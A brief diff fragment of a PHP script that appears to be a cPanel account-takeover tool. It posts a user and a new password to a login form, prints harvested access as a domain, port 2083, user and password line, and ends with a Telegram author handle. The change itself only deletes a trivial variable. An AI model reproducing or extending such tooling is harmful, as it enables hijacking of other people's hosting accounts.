@@ -210,6 +210,5 @@ if(isset($g2) && $codeSC != ""){
     $postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
     echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
 }
-$txt = "PHP";
 echo "Telegram:@blackpanther1337";
 ?>
